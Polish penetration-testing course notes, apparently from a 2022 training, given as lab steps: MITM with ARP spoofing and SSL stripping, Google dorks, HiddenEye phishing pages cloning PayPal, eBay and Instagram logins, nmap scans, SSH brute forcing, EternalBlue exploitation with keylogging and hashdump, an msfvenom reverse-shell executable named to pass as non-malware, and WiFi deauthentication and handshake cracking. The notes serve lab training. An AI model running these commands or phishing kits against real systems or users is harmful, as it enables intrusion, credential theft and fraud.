@@ -1,0 +1,1198 @@
+📅 08.10.2022 🕘 [09:00]
+
+Global Bypassing the Perimeter
+
+Wykładowca: Aleksander Wojdyła
+aleksanderw@hackeru.com
+
+
+
+Chapter 1 Wireshark & MITM
+= - = - = - = - = - = - = 
+
+ℹ️ Przerwy: 
+
+10:30 - 11:00
+13:00 - 13:45
+15:00 - 15:15
+
+---
+
+🔗 -- Karty wifi na zajęcia - obsługujące tryb `monitor mode`
+https://sapsan-sklep.pl/pages/rapid-search-results?q=alfa
+
+Kod rabatowy (7%): MACIEJCIESLA_4HAKERU
+
+---
+
+### 📋 -- Lab01 Introduction to Wireshark
+
+Ustawienia sieciowe w VB: `Bridged Adapter`
+
+#Uruchomienie Wireshark:
+    wireshark
+    
+***
+
+### 📋 -- Lab02 Exporting Images & Files from HTTP
+
+Nieszyfrowana strona: http://hack-yourself-first.com/
+
+#Ustawiamy filtr: http
+
+#Pobieranie obiektów:
+    File --> Export Objects --> HTTP --> Preview
+
+***
+
+🔗 -- tcpdump Tutorial with Examples
+https://danielmiessler.com/study/tcpdump/
+
+🔗 -- Tcpdump: Przykłady, opcje
+https://pol.go-travels.com/74623-tcpdump-linux-command-unix-command-4097081-7858091
+
+🔗 -- Filtering tcpdump
+https://www.redhat.com/sysadmin/filtering-tcpdump
+
+🔗 -- tshark(1) Manual
+https://www.wireshark.org/docs/man-pages/tshark.html
+
+🔗 -- Wyrażenia regularne
+https://regexr.com/
+
+🔗 -- Dokumentacja do tsharka 
+https://www.wireshark.org/docs/man-pages/tshark.html+https://tshark.dev/
+
+***
+
+### 📋 -- Lab03 Tcpdump & Tshark
+
+    sudo apt-get install tcpdump
+
+
+#Wyświetlenie pliku pomocy
+
+    tcpdump --help
+
+
+#Wczytanie pliku do analizy
+
+    tcpdump -r Wireshark.pcap
+
+
+#Wyświetlenie podstawowych informacji
+
+    sudo tcpdump -ni eth0
+
+
+#Wyświetlenie pakietów DNS:
+    sudo tcpdump -ni eth0 port 53
+
+#Wyświetlenie pakietów HTTP i HTTPS:
+    sudo tcpdump -ni eth0 port 80
+    sudo tcpdump -ni eth0 port 443
+
+#Tshark
+
+    sudo apt-get install tshark
+
+
+#Analiza ruchu
+
+    tshark --color
+
+
+***
+
+🔗 -- Sprawdzenie naszego adresu IP
+http://www.ip.pl/
+
+***
+
+### 📋 -- Lab04 Capturing ICMP and DNS Packets
+
+Kali: `Bridged Adapter`
+
+Host (Windows):
+
+#Wyczyszczenie tablicy DNS
+
+    ipconfig /flushdns
+
+
+#Ponowne wyświetlenie
+
+    ipconfig /displaydns
+
+
+#Kali > Wireshark > eth0
+
+#Windows:
+    nslookup google.com
+    
+#Wyświetlenie wszystkich DNS w Wireshark (filtry):
+    dns
+    
+    lub
+    
+    UDP.port == 53
+
+#Inne filtry - pakiety ICMP
+
+Windows Host:
+
+    tracert google.com
+
+
+Wireshark filtr
+
+    icmp
+
+
+#Traceroute na Kali
+
+    sudo apt-get install traceroute
+
+
+    traceroute google.com
+
+
+Wireshark filtr
+
+    icmp
+
+
+***
+
+### 📋 -- Lab05 Sniffing HTTP Login Requests
+
+http://chomikuj.pl/
+
+#Wpisujemy poświadczenia do logowania (dowolne)
+
+#Wireshark filtr:
+    http.request.method == POST
+
+#HTML Form URL Encoded:
+    - Login: chomik1
+    - Password: haslo123
+        
+lub
+
+#Follow TCP Stream
+
+***
+
+💡-- Bruteshark
+https://github.com/odedshimon/BruteShark
+https://github.com/odedshimon/BruteShark/blob/master/README.md
+
+***
+
+[MITM - Man in the Middle]
+
+### 📋 -- Lab06 Performing MITM
+
+Wszystkie VM należy umieścić w sieci `NAT Network`
+
+Windows (10.0.2.15):
+    ping <IP Kali> 10.0.2.22
+
+
+Z poziomu Windows:
+cmd:
+    arp -a  
+
+Spawdzamy adres Wondowsa i routera (gateway)
+    ifconfig
+
+Z poziomu Kali:
+    sudo apt-get install dsniff
+    uruchomić whireshark
+    sudo arpspoof -i eth0 -t ADRES_WINDOWSA ADRES_DEFAULT_GATEWAY
+np.: sudo arpspoof -i eth0 -t 10.0.2.15 -r 10.0.2.1
+
+Z poziomu Windows:
+cmd:
+    arp -a  
+
+***
+
+🔗 -- Tor - Darknet Opsec By a Veteran Darknet Vendor & the Hackers Mentality
+https://www.youtube.com/watch?v=NGiUhjuB22Y
+
+***
+
+### 📋 -- Lab07 Examine the Victim's Data
+
+na kalim wykonujemy poniższe polecenia:
+   sudo apt-get update
+   sudo apt-get install bettercap
+   sudo reboot -f
+   sudo bettercap
+   set arp.spoof.targets 10.0.2.15 #podajemy ip windowsa
+   arp.spoof on
+
+na windows:
+   arp -a
+   
+gdyby nie działało to na kalim wpisać komendę (wcześniej wyłączyć bettercap):
+   sudo su
+   echo "1" > /proc/sys/net/ipv4/ip_forward
+natępnie cała procedura od nowa.
+
+
+W whireshark (aby wyfiltrować):
+   ip.src == IP_WINDOWSA
+
+Więcej filtrów dla Wireshark:
+🔗 – Wireshark Cheat Sheet
+https://stationx-public-download.s3.us-west-2.amazonaws.com/Wireshark-Cheat-Sheet-v1.pdf
+
+***
+
+### 📋 -- Lab08 SSL Strip
+
+Importujemy pobraną maszynę;
+    Plik --> Importuj maszynę --> Wybieramy plik SSL Strip.ova
+
+pojawią sie 2 maszyny (Windows i Kali)
+hasło:
+   root:toor
+
+🔗 – CVE Details
+https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-739/Microsoft-Windows-Xp.html
+
+🔗 – Informację o nowych atakach
+https://zaufanatrzeciastrona.pl/
+https://niebezpiecznik.pl/
+
+🔗 – Programy bug bounty
+https://www.hackerone.com/
+https://www.bugcrowd.com/
+
+🔗 – Platformy do nauki
+https://academy.hackthebox.com/path/preview/bug-bounty-hunter
+https://portswigger.net/web-security/certification
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+sudo nano /etc/ettercap/etter.conf
+
+i zmianiamy w pliku konfiguracyjnym etter.conf:
+    [privs]
+    ec_uid = 0                # nobody is the default
+    ec_gid = 0                # nobody is the default
+# if you use iptables:
+   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+
+Zapisujemy: Ctrl + X Enter Y
+
+Należy uruchomic ettercap:
+    sudo ettercap -G
+wybieramy:
+    Sniff --> Unified Sniffing --> eth0
+    Host --> Hosts List --> Scan for hosts
+    Target 1: IP Windowsa
+    Target 2: IP Default Gateway
+    Mitm --> ARP Poisoning --> Sniff Remote Connection
+    Plugins --> Manage the plugins --> SSLSTRIP
+
+testujemy np.: na https://wp.pl
+W whireshark (aby wyfiltrować):
+    http.request.method == POST
+
+
+🔗 – Ciekawostka 
+https://en.wikipedia.org/wiki/RollerCoaster_Tycoon_(video_game)
+https://github.com/features/copilot
+https://antyweb.pl/atak-akwarium-termometr
+https://thehacksummit.com/
+https://omhconf.pl/omh-2022/
+
+
+Na windowsie należy pobrać XArp:
+https://softfamous.com/postdownload-file/xarp/7395/3233/
+
+ponownie nalezy ucuchomić ettercap
+   sudo ettercap -G
+   Start unified sniffing
+   Current targets
+   Host --> Hosts List --> Scan for hosts
+   Target 1: IP Windowsa
+   Target 2: IP Default Gateway
+   Mitm --> ARP Poisoning --> Sniff Remote Connection
+
+***
+
+📅 09.10.2022 🕘 [09:00]
+
+Chapter 2 OSINT and Social Engineering & Network Scanning
+= - = - = - = - = - = - = - = - = - = - = - = - = - = - =
+
+ℹ️ Przerwy: 
+
+10:30 - 11:00
+13:00 - 13:45
+15:00 - 15:15
+
+🔗 – Ciekawostka 
+https://sapsan-sklep.pl/products/flipper-zero
+
+***
+
+### 📋 -- Lab01 Introduction to Information Gathering
+
+🔗 – Web tool
+https://who.is
+https://whois.net/
+https://sitereport.netcraft.com/
+https://osintframework.com/
+
+***
+
+### 📋 -- Lab02 Google Hacking
+
+🔗 – Google hacking
+intitle:"index of" "parent directory"
+intitle:"Printer Status" AND inurl:"/PrinterStatus.html"
+intitle: "index of" / "upload/file"
+inurl:"phpinfo.php"
+site:pastebin.com password
+intitle:"index of" "parent directory"
+site:pastebin.com password
+intitle:"Device(IP CAMERA)" "language" -com|net
+intitle:"index of smtp"
+intitle:"Network Camera" inurl:main.cgi
+intitle: “Printer Status” AND inurl:"/PrinterStatus.html"
+inurl:"/PrinterStatus.html"
+ext:java intext:"import org.apache.logging.log4j.Logger;"
+
+🔗 – Google Dorking: 
+site: [site]
+inurl: [term]
+intitle: index of
+related: [site]
+intext: [term]
+link: [site] 
+filetype: [term]
+
+🔗 – Przydatne serwisy i ciekawe artykuły
+https://sekurak.pl/krytyczna-podatnosc-w-log4j-co-wiemy-jak-wygladaja-ataki-jak-sie-chronic-cve-2021-44228-rce/
+https://www.exploit-db.com/google-hacking-database
+https://www.exploit-db.com/
+https://securitytrails.com/blog/google-hacking-techniques
+https://haveibeenpwned.com/
+https://www.dehashed.com/
+https://web.archive.org/web/20220000000000*/https://www.wp.pl/
+https://web.archive.org/web/20090604124011/http://wp.pl/
+https://www.shodan.io/
+https://pl.wikipedia.org/wiki/Kevin_Mitnick
+Mitnick Kevin - Sztuka Podstepu https://docer.pl/doc/8n0cnv
+https://shop.hak5.org/products/usb-rubber-ducky
+https://en.wikipedia.org/wiki/Command_and_control
+https://www.thispersondoesnotexist.com/
+emkei.cz
+https://www.cloudtalk.io/
+https://www.spoofcard.com/
+bitly.com
+https://grabify.link/
+https://steamcommunity.com/
+
+***
+
+### 📋 -- Lab03 Shodan & Maltego
+
+🔗 – 10-minutowe konto
+https://10minutemail.com/
+
+🔗 – Shodan
+https://www.shodan.io/
+https://github.com/jakejarvis/awesome-shodan-queries
+https://www.osintme.com/index.php/2021/01/16/ultimate-osint-with-shodan-100-great-shodan-queries/
+
+#Przykładowe zapytania w Shodan:
+"Server: yawcam" "Mime-Type: text/html"
+"authentication disabled" "RFB 003.008"
+mikrotik streetlight
+title:camera
+
+🔗 – Maltego
+https://www.maltego.com/ce-registration/
+sudo apt-get install maltego
+Maltego CE (Free)
+
+#Przykładowa strona do skanowania
+scanme.nmap.org
+
+***
+
+### 📋 -- Lab04 HiddenEye
+
+git clone https://github.com/efenes79/HiddenEye-Legacy.git
+sudo apt install python3-pip
+sudo pip3 install pgrep
+sudo pip3 install pyngrok
+cd HiddenEye-Legacy/
+sudo pip3 install -r requirements.txt
+cd HiddenEye-Legacy
+sudo nano requirements.txt
+i zmianiamy wartości na:
+    pgrep==2020.12.3
+    kill==2020.12.3
+i zapisujemy: Ctrl+X Y Enter
+sudo pip3 install -r requirements.txt
+chmod +x HiddenEye.py
+sudo python3 HiddenEye.py
+I accept EULA
+
+#Ebay
+wybieramy 29 dalej B
+https://www.ebay.com/
+dalej 80 i 0
+http://127.0.0.1
+Ctrl+X
+Ctrl+C
+sudo python3 HiddenEye.py
+
+#Paypal
+31 i B
+https://www.paypal.com/signin
+80 i 0
+
+#Instagram
+8>1>B
+https://www.instagram.com/accounts/login/
+0
+
+***
+
+### 📋 -- Lab05 Site Mirroring
+
+sudo apt-get install httrack
+httrack
+cd /var/www/html
+sudo rm -rf index.html
+sudo httrack https://www.minecraft.net/
+sudo service apache2 start
+
+***
+
+[Network Scanning]
+
+### 📋 -- Lab06 Hping3
+
+sudo apt install hping3
+hping3
+
+VirtualBox: Kali > Clone
+
+Setup:
+1. Kali Attacker 10.0.2.22 (lewa maszyna na VOD)
+2. Kali Victim 10.0.2.26 (prawa maszyna na VOD)
+
+#Maszyny muszą się ping'ować
+
+Kali Attacker 10.0.2.22
+
+    hping3 --help
+
+    ping 10.0.2.26
+
+    sudo hping3 --traceroute -V -1 10.0.2.26
+
+
+Kali Victim 10.0.2.26
+
+    Wireshark > filtr icmp
+
+
+***
+
+🔗 – Manuale do nmap:
+https://linux.die.net/man/1/nmap
+https://allabouttesting.org/nmap-cheat-sheet/
+https://www.tutorialspoint.com/nmap-cheat-sheet
+http://nmapkurs.weebly.com/
+
+***
+
+### 📋 -- Lab07 Host Scanning
+
+#Na Kali Victim 10.0.2.26 uruchamiamy usługi apache2 i ssh
+
+    sudo service apache2 start
+
+    sudo service apache2 status
+
+
+    sudo service ssh start
+
+
+#Z Kali Attacker 10.0.2.22 wykonujemy scan
+
+    nmap 10.0.2.26
+
+    nmap 10.0.2.26 -oN wyniki.txt
+
+
+#Wykonanie szybkiego scanu
+
+    nmap --help
+
+    nmap 10.0.2.26 -T4 -Pn
+
+
+#Przeskanowanie wszystkich portów
+
+    nmap 10.0.2.26 -T4 -Pn -p-
+
+
+***
+
+### 📋 -- Lab08 Stealth Scan
+
+#Wireshark - Kali Victim 10.0.2.26
+
+    filtr: ip.dst == 10.0.2.26
+
+
+#Kali Attacker 10.0.2.22
+
+    sudo nmap 10.0.2.26 -sS
+
+    sudo nmap 10.0.2.26 -sF
+
+    sudo nmap 10.0.2.26 -sA
+
+    sudo nmap 10.0.2.26 -sX
+
+
+***
+
+🔗 – IDLE Scan
+https://nmap.org/book/idlescan.html
+
+***
+
+🔗 – Nmap i 12 przydatnych skryptów NSE
+https://sekurak.pl/nmap-i-12-przydatnych-skryptow-nse/
+
+***
+
+### 📋 -- Lab09 Network Discovery
+
+#Skanowanie po całej masce sieci
+
+    nmap -sn 10.0.2.0/24
+
+
+🔗 – IP Subnet Calculator
+https://www.calculator.net/ip-subnet-calculator.html
+
+***
+
+### 📋 -- Lab10 OS & Service Version Detection
+
+#Enumeracja wersji systemu operacyjnego
+
+    sudo nmap 10.0.2.26 -O
+
+
+#Uruchomione serwisy
+
+    sudo nmap 10.0.2.26 -sV
+
+
+***
+
+🔗 – Baza danych Exploit'ów
+https://www.exploit-db.com/
+
+#W wireshark:
+ip.src == 10.0.2.22
+
+sudo nmap 10.0.2.26 -d
+
+🔗 –  odpowiednik nmap
+https://github.com/RustScan/RustScan
+
+🔗 –  nessus
+https://www.tenable.com/products/nessus
+
+#Netcat
+nc 10.0.2.26 22
+
+***
+
+🔗 – AutoRecon (Tib3rius) - przydatne do OSCP
+https://github.com/Tib3rius/AutoRecon
+
+🔗 – Przydatne serwisy i ciekawe artykuły
+https://securityonionsolutions.com/software
+https://tryhackme.com
+https://tryhackme.com/room/furthernmap
+https://elearnsecurity.com/product/ejpt-certification/
+https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester
+https://tryhackme.com/room/furthernmap
+https://pwnagotchi.ai/
+https://elearnsecurity.com/product/ecpptv2-certification/
+https://thehacksummit.com/
+
+
+#Na kolejne zajęcia do pobrania:
+https://ln2.sync.com/dl/d647aaaa0/vzacvmab-d5tgezhx-kdztsfs4-rp5jfgpe
+
+***
+
+📅 15.10.2022 🕘 [09:00]
+
+Global Bypassing the Perimeter
+
+Chapter 3 Password Cracking & Metasploit and Known CVEs
+= - = - = - = - = - = - = - = - = - = - = - = - = - = -
+
+[Password Cracking]
+
+🔗 -- Timing attack
+https://en.wikipedia.org/wiki/Timing_attack
+
+🔗 -- YubiKey 5 NFC - Klucz do uwierzytelniania w aplikacjach
+https://www.yubico.com/pl/product/yubikey-5-nfc/
+
+🔗 -- YubiKey Bio - FIDO Edition - z funkcją Biometrii
+https://www.yubico.com/pl/product/yubikey-bio/
+
+🔗 -- Rainbow table
+https://en.wikipedia.org/wiki/Rainbow_table
+
+🔗 -- Crackstation - rozwiązywanie hash'y online
+https://crackstation.net/
+
+***
+
+### 📋 -- Lab01 Hash Encryption
+
+https://www.md5hashgenerator.com/
+
+haslo123 > 1a7fcdd5a9fd433523268883cfded9d0
+
+7c6a180b36896a0a8c02787eeafb0e4c > password1
+0192023a7bbd73250516f069df18b500 > admin123
+
+d6ca3fd0c3a3b462ff2b83436dda495e > kali
+1870a829d9bc69abf500eca6f00241fe > wordpress
+
+***
+
+### 📋 -- Lab02 John The Ripper
+
+🔗 -- Download Johnme.rar - 78.8 KB
+https://ln5.sync.com/dl/ce510bf50/i6gzsnfp-frciiuwc-bgrtgmdz-kz6idy5x
+
+    /usr/share/john
+
+    sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+    ls /usr/share/wordlists
+
+    head -n 30 /usr/share/wordlists/rockyou.txt
+
+
+#przechodzimy do katalogu gdzie jest Johnme.rar
+
+    rar2john Johnme.rar > johnme.hash
+
+    cat johnme.hash
+
+    john --wordlist=/usr/share/wordlists/rockyou.txt johnme.hash
+
+
+#otwieramy plik Johnme.rar pass:wombat
+
+    unrar e Johnme.rar
+
+
+    /usr/share/john/pdf2john.pl PDF.pdf > pdf.hash
+
+    cat pdf.hash
+
+    john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
+
+    pass:baxter
+
+
+#Identify hash types - https://hashes.com/en/tools/hash_identifier
+
+EFEB76E50E753C00E6A5295838DB1471 > pass:darkside
+
+z Terminala Kali
+
+    echo "EFEB76E50E753C00E6A5295838DB1471" > ntlm.hash
+
+    john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm.hash
+
+
+🔗 -- Wordlists
+https://www.securedyou.com/rockyou-txt-rockyou2021-download/#Rockyoutxt_RockYou2021_Wordlist_Download
+https://github.com/ohmybahgosh/RockYou2021.txt
+https://github.com/danielmiessler/SecLists/
+
+***
+
+### 📋 -- Lab03 Dictionary
+
+#crunch
+
+    crunch 3 4 abcdef -o crunchlist.txt
+
+
+#cewl
+
+    cewl http://wp.pl > wp
+
+    cewl https://www.wp.pl/ > wp
+
+    cat wp
+
+
+    cewl http://scanme.nmap.org/ > scan
+
+    cat scan
+
+
+#cupp - tworzenie własnego słownika
+
+    sudo apt-get install cupp
+
+
+    cupp -i #tryb interaktywny
+
+    First Name: Bob
+
+    Surname: Nowak
+
+    Nickname: bnovak
+
+    Birthdate: 15101975
+
+    Partners name: Karina
+
+    Partners nickname: k@r1na
+
+    Partners birthdate: 10101995
+
+    Child's name: Ryan
+
+    Child's nickname: ryanair
+
+    Child's birthdate: 01012015
+
+    Pet's name: Pusia
+
+    Company name: Wirtualna Polska
+
+    Add some keywords?: Y
+
+    Enter words: karp,programista,klawiatura,swiat
+
+
+#powstaje własna lista haseł ok. 16000 wpisów
+
+
+***
+
+
+### 📋 -- Lab04 Automation
+
+
+Kali:
+
+
+#Utworzenie nowego użytkownika:
+
+    sudo adduser bob
+
+    password: abcd
+
+
+#Uruchomienie usługi ssh
+
+    sudo service ssh start
+
+
+#Utworzenie słownika
+
+    crunch 3 4 abcdef -o list.txt
+
+
+#Atak na ssh za pomocą hydra
+
+
+    hydra -l bob -P list.txt 127.0.0.1 -t 4 ssh -v
+
+
+    *127.0.0.1 = localhost lub IP dowolnie atakowanej maszyny
+
+
+#Atak na ssh za pomocą medusa
+
+
+    medusa -u bob -P list.txt -h 127.0.0.1 -M ssh
+
+
+#Atak na ssh za pomocą ncrack
+
+    ncrack -p ssh -u bob -P list.txt 127.0.0.1 -f
+
+
+***
+
+🔗 -- Tool comparison of Remote brute-force password crackers
+https://linuxsecurity.expert/compare/tools/remote-brute-force-password-crackers/
+
+***
+
+[Metasploit and Known CVEs]
+
+💡 -- Program BugBounty Tesla
+https://bugcrowd.com/tesla
+
+***
+
+### 📋 -- Lab05 CVEs and Exploits
+
+https://www.cvedetails.com/cve/CVE-2011-3640
+https://www.cvedetails.com/cve/CVE-2015-9173/
+https://www.exploit-db.com/exploits/50592
+https://www.exploit-db.com/exploits/41962
+
+🔗 -- Konferencja
+https://omhconf.pl/omh-2022/
+
+🔗 -- Server C2
+https://en.wikipedia.org/wiki/Command_and_control
+https://scottctaylor12.github.io/lambda-function-urls.html
+
+🔗 -- Szyfrowanie PGP
+https://www.maketecheasier.com/pgp-encryption-how-it-works/
+
+***
+
+### 📋 -- Lab06 Msfconsole
+
+Virtualbox: Plik --> Importuj urządzenie wirtualne
+Sieć NAT Network
+root: toor
+   sudo nmap -sV -O ip_maszyny_EthernalBlue -Pn
+   sudo nmap --script vuln 10.0.2.30
+   sudo systemctl start postgresql
+   sudo msfdb init
+   msfconsole
+   search ms17-010
+
+   use auxiliary/scanner/smb/smb_ms17_010
+   show info
+   show options
+   set RHOSTS IP_WINDOWSA/OFIARY
+   run/exploit
+   
+   use exploit/windows/smb/ms17_010_eternalblue
+   show info
+   show options
+   set RHOSTS IP_WINDOWSA/OFIARY
+   set lhost IP_NASZEGO_KALIEGO 
+   run/exploit
+   shell
+   screenshare
+   keyscan_start
+   keyscan_dump
+   help
+   shell
+   cd C:\Users\Root\Desktop
+   echo "Hello World" > plik.txt
+   echo %cd%
+   exit
+   download /Users/Root/Desktop/plik.txt
+   Ctrl+Shift+T
+   echo "EFEB76E50E753C00E6A5295838DB1471" > plik.txt
+   meterpreter>
+   upload plik.txt
+   upload plik.txt /Users/Root/Desktop/
+   hashdump
+   Root:1001:aad3b435b51404eeaad3b435b51404ee:afc44ee7351d61d00698796da06b1ebf:::
+   echo       "Root:1001:aad3b435b51404eeaad3b435b51404ee:afc44ee7351d61d00698796da06b1ebf:::" > hash.hash
+   john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.hash
+   john --format=NT hash.hash
+
+***
+   
+### 📋 -- Lab07 Msfvenom
+
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.22 LPORT=4444 -f exe > ToNieWirus.exe
+
+#gdzie LHOST=Ip_Kaliego
+   
+   ls | grep exe
+   use exploit/multi/handler
+   set payload windows/meterpreter/reverse_tcp
+   ip addr
+   set lhost 10.0.2.22
+   set lport 4444
+   exploit
+   
+#zeby udostępnić plik po http:
+   python3 -m http.server:8080
+
+   http://10.0.2.22:8080
+
+🔗 -- Cobalt Strike
+https://www.cobaltstrike.com/
+
+***
+
+📅 16.10.2022 🕘 [09:00]
+
+Global Bypassing the Perimeter
+
+Chapter 4 WiFi-Attacks & Web Anonymity
+= - = - = - = - = - = - = - = - = - = 
+
+🔗 -- Cloudflare
+https://www.cloudflare.com/
+
+[Web Anonymity]
+
+### 📋 -- Lab04 ProxyChains
+
+#instalacja usługi Tor
+   sudo apt-get install tor
+   sudo service tor start
+   sudo service tor status
+   sudo apt-get install proxychains
+   sudo nano /etc/proxychains.conf
+ Usuwamy # z dynamic_chain
+ Dodajemy # przed strict_chain
+ Zapisujemy Ctrl+X Y Enter
+   proxychains firefox www.google.com
+   https://whatismyipaddress.com/ip-lookup
+   http://free-proxy.cz/en/proxylist/country/PL/all/ping/all
+   195.206.112.59
+   socks4 195.206.112.59 5678
+   https://spys.one/free-proxy-list/PL/
+
+🔗 -- ciekawe artykuły:
+https://en.wikipedia.org/wiki/Tornado_Cash
+https://nordvpn.com/pl/blog/protocols/
+https://protonvpn.com/pl/
+https://www.yubico.com/pl/product/yubikey-bio/
+https://tails.boum.org/
+https://www.whonix.org/
+https://www.youtube.com/watch?v=NGiUhjuB22Y
+
+***
+
+### 📋 -- Lab05 Anonsurf
+
+https://github.com/Und3rf10w/kali-anonsurf.git
+   git clone https://github.com/Und3rf10w/kali-anonsurf.git
+   cd kali-anonsurf
+   sudo ./installer.sh
+   sudo anonsurf start
+   sudo anonsurf restart
+   sudo anonsurf stop
+
+***
+
+### 📋 -- Lab06 Tor Browser
+
+https://www.torproject.org/dist/torbrowser/11.5.4/tor-browser-linux64-11.5.4_en-US.tar.xz
+
+http://s4k4ceiapwwgcm3mkb6e4diqecpo7kvdnfr5gg7sph7jjppqkvwwqtyd.onion/
+http://t43fsf65omvf7grt46wlt2eo5jbj3hafyvbdb7jtr2biyre5v24pebad.onion/
+https://thehiddenwiki.org/
+http://cebulka7uxchnbpvmqapg5pfos4ngaxglsktzvha7a5rigndghvadeyd.onion/
+
+🔗 -- ciekawe artykuły:
+https://www.youtube.com/watch?v=NGiUhjuB22Y
+https://www.youtube.com/watch?v=icBD5PiyoyI
+https://www.getmonero.org/
+
+***
+
+[WiFi-Attacks]
+
+🔗 -- Analysing WPA3's Dragonfly Handshake
+https://wpa3.mathyvanhoef.com/
+
+🔗 -- Wi-Fi Protected Access
+https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access
+
+🔗 -- Opportunistic Wireless Encryption
+https://en.wikipedia.org/wiki/Opportunistic_Wireless_Encryption
+
+***
+
+### 📋 -- Lab01 Handshake Cracking
+
+🔗 -- VB Extention Pack
+https://download.virtualbox.org/virtualbox/6.1.34/Oracle_VM_VirtualBox_Extension_Pack-6.1.34.vbox-extpack
+
+#Ustawienie USB 3.0 lub 1.1 w Globalnych Ustawieniach VirtualBox
+
+Kali Terminal:
+
+    iwconfig
+
+
+#Instalacja sterowników (w przypadku braku wlan0) dla karty AWUS036ACS
+
+    sudo apt update
+
+    sudo apt install -y realtek-rtl88xxau-dkms
+
+    sudo apt install dkms
+
+    lsusb
+
+    iwconfig
+
+
+#W przypadków problemów wykonujemy instalację:
+    git clone https://github.com/aircrack-ng/rtl8812au
+    cd rtl8812au/
+    make
+    sudo make install
+    
+🔗 -- Instalacja AWUS036ACS na Kali Linux
+https://www.youtube.com/watch?v=ZjfCclipA8k
+
+#Uruchomienie airmon-ng
+
+    sudo airmon-ng
+
+
+#Tworzymy HotSpot (AP) na telefonie Android (rekomendowany)
+
+    WPA2
+
+    pass:1122334455
+
+
+#Skanowanie sieci
+
+    sudo airmon-ng start wlan0
+
+    sudo airodump-ng wlan0
+
+    lub
+
+    sudo airodump-ng wlan0mon
+
+
+#Podłącznie do wybranej sieci TestSiec
+
+    sudo airodump-ng wlan0 --bssid <INFORMACJA_Z_BSSID> -c <INFORMACJA_Z_CH> -w handshake
+
+
+Handshake znajduje się w pliku np. handshake-07.cap
+
+#Atak deautoryzacyjny z użyciem aireplay-ng - wymuszamy ponowne połączenie z HotSpota (AP)
+
+    sudo aireplay-ng -0 150 -a <BSSID_HOTSPOT> -c <MAC_URZADZENIA_OFIARY> wlan0
+
+    sudo aireplay-ng -0 150 -a 08:7E:64:E6:84:C0 -c 9E:1C:38:9F:48:16 wlan0
+
+
+#Jeżeli ataku nie można wystartować należy wykonać komendy
+
+    sudo airmon-ng check kill
+
+    sudo airmon-ng start wlan0
+
+
+#Wyszukanie hash'a hasła z przechwyconego pliku handshake.cap - aircrack-ng
+
+    aircrack-ng -w /usr/share/wordlists/rockyou.txt PLIK_HANDSHAKE.cap
+
+    #KEY FOUND! [1122334455]
+
+
+***
+
+### 📋 -- Lab02 Wifite
+
+#Instalacja
+
+    sudo apt install wifite
+
+
+#Uruchomienie
+
+    sudo wifite
+
+    lub z pominięciem ataku WPS
+
+    sudo wifite --no-wps
+
+
+#Przerwanie wyszukiwania
+
+    Ctrl+C
+
+
+#Wybór sieci do ataku
+
+    numer sieci z listy > 1
+
+
+#Uruchomienie wifite z określeniem własnego słownika
+
+    sudo wifite --dict /usr/share/wordlists/rockyou.txt
+
+
+***
+
+### 💡 – Lab Airgeddon
+
+#Instalacja i uruchomienie
+
+    git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+
+    cd airgeddon
+
+    ./airgeddon.sh
+
+
+🔗 -- How to Perform an Evil Twin Attack With Airgeddon
+https://livelinuxusb.com/how-to-perform-an-evil-twin-attack-with-airgeddon/
+
+***
+
+### 💡 Extra Miles
+
+🔗 -- TryHackMe
+https://tryhackme.com/hacktivities
+
+🔗 -- HacktheBox
+https://www.hackthebox.com/business/professional-labs/cloud-labs-blacksky
+
+🔗 -- eJPT
+https://elearnsecurity.com/product/ejpt-certification/
+
+🔗 -- eCPPTv2
+https://elearnsecurity.com/product/ecpptv2-certification/
+
+🔗 -- AZ-900: Microsoft Azure Fundamentals
+https://learn.microsoft.com/en-us/certifications/exams/az-900
+
+🔗 --  Azure Administrator Associate
+https://learn.microsoft.com/en-us/certifications/azure-administrator/
+
+🔗 --  CompTIA Security+
+https://www.comptia.org/certifications/security
+
+🔗 -- CompTIA PenTest+
+https://www.comptia.org/certifications/pentest
+
+***
